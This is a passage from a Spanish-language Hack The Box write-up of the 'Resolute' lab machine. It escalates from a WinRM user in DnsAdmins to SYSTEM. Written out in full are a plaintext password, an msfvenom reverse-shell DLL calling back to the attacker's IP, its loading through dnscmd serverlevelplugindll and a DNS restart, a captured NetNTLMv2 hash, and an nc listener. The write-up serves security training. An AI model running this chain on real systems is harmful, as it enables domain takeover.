Password changeable          1/14/2022 7:55:02 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\PSTranscripts\20191203>
```

```bash
❯ evil-winrm -u "ryan" -p "Serv3r4Admin4cc123\!" -i 10.10.10.169

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
megabank\ryan
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

Vamos a ver que grupos existen localmente.

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> net localgroup

Aliases for \\RESOLUTE

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*System Managed Accounts Group
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents>
```

Vemos el grupo **DnsAdmins**, vamos a ver quien pertenece a dicho grupo.

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> net localgroup DnsAdmins
Alias name     DnsAdmins
Comment        DNS Administrators Group

Members

-------------------------------------------------------------------------------
Contractors
The command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents>
```

Y vemos que los usuarios que están en el grupo **Contractors** pertenecen al grupo **DnsAdmins** y dentro de **Contractors** está el usuario **ryan**; por lo tanto ya debemos estar pensando de una forma de escalar privilegios mediante un *dll* malcioso y reiniciando el servicio DNS. Para mayor información podríamos consultar el siguiente recurso: [abhizer](https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/). Por lo tanto, vamos a crearnos primeramente nuestra *dll* maliciosa:

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.27 LPORT=443 --platform=windows -f dll > plugin.dll
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 8704 bytes
❯ ll
.rw-r--r-- root root 8.5 KB Thu Jan 13 22:00:20 2022  plugin.dll
```

Ahora nos compartimos un recurso con `impacket-smbserver` y haciendo abusando de los privliegios que tenemos como el usuario **ryan** podemos ejecutar la utilidad `dnscmd.exe` para apuntar a nuestro archivo malicioso.

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.27\smbFolder\plugin.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents>
```

No vemos ninguna petición sobre nuestro servicio SMB, ya que es necesario parar el servicio DNS y luego iniciarlo para que cargue la configuración y llame a nuestro archivo malicioso; por lo tanto nos ponemos en escucha por el puerto 443:

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3096
        FLAGS              :
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.169,55779)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:77127e0c79c1f690ddebd749c35cc15b:010100000000000000ef904bfc08d801731f0650a394b44a000000000100100041004100740076005900690065004c000300100041004100740076005900690065004c00020010005200620073004100480076004500470004001000520062007300410048007600450047000700080000ef904bfc08d8010600040002000000080030003000000000000000000000000040000015b57e8bed15fcd4cb493c56b22c31121b8400dc4fbcd3f9193586809d235e9b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320037000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbFolder)
[*] Closing down connection (10.10.10.169,55779)
[*] Remaining connections []
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.169] 55780
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\system32>
```

Ya somos el usuario `nt authority\system` y podemos visualizar la flag (root.txt). En caso de que no funcione al detener el servicio DNS y volverlo a arrancar, volvermos a ejecutar el comando `dnscmd.exe /config /serverlevelplugindll \\10.10.14.27\smbFolder\plugin.dll`, paramos el servicio `sc.exe stop dns`, esperamos unos segundos y levantamos el servicio `sc.exe start dns`.
